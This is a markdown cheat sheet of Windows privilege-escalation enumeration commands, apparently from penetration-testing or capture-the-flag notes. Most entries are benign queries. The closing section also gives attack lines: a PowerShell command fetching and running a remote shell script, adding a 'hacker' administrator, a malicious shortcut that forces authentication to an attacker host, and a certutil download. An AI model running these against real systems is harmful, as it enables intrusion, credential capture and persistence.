
# Windows Privesc, Enumeration

## Useful links :D
[Windows Command-line reference](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands#command-line-reference-a-z)

## Basic system Enumeration

- Lists every running service on the machine :
`tasklist /svc`

- Show installed software :
`wmic product get name`

- Show installed software (via PowerShell) :
`Get-WmiObject -Class Win32_Product | Select Name, Version`

- Show installed software via powershell and registry keys : 
```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

- Prints every environment variables :
`set`

- View Detailed Configuration Information : 
`systeminfo`

- View windows version (in PowerShell)
`[environment]::OSVersion.Version`

- Query info on a process by PID : 
`get-process -Id <PID>`

## Basic Network Enumeration : 

- Interface(s), IP Address(es), DNS Information : 
`ipconfig /all`

- Prints the arp table :
`arp -a`

- Prints the routing table :
`route print`

- Display active network connections :
`netstat -ano`

- Display information about a specific TCP port (with PowerShell): 
`Get-Process -Id (Get-NetTCPConnection -LocalPort 9999).OwningProcess`

- Display information about a specific UDP port (with PowerShell): 
`Get-Process -Id (Get-NetUDPConnection -LocalPort 6666).OwningProcess`

## Users & Group Information

- Show logged-in users : 
`query user`

- Display currenr user : 
`echo %USERNAME%` 

- Show current user privileges : 
`whoami /priv`

- Show current user group information : 
`whoami /groups`

- Show all users : 
`net user` 

- Show all groups : 
`net localgroup`

- Query details about a group : 
`net localgroup administrators`

- Query password policy and other account information : 
`net accounts`

## Enumerating Protections

- Get Windows Defender status :
`Get-MpComputerStatus`

- Lists all AppLocker rules : 
`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

- Tests AppLocker Policy
`Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone`

- Lists Patches and Updates 
`wmic qfe`

- Lists Patches and Updates (via PowerShell)
`Get-HotFix | ft -AutoSize`

- Checking if UAC is enabled :
`reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA`

- Checking UAC level : 
`reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin`
## Named pipes shenanigans

- Query named pipes using [pipelist](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist) from SysInternals : 
`pipelist.exe /accepteula`

- Query named pipes using PowerShell :
`Get-ChildItem \\.\pipe\`

- Show DACLs of a named pipe using [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from SysInternals :
`accesschk.exe /accepteula \\.\Pipe\lsass -v`

## Other useful stuff

- Download a powershell script and execute it from memory :
`powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.4:8080/shell.ps1')`

- Add a user "hacker" to the administrator group :
`net localgroup Administrators hacker /add`

- Monitor newly created processes :
```powershell
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
- Generate a malicious shortcut 
```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

- Using certutil to download a file :
`certutil.exe -urlcache -split -f http://10.10.14.143/example.bat example.bat`

- Using certutil to encode and decode a file in base64 :
```bat
certutil -encode file1 encodedfile
certutil -decode encodedfile file2
```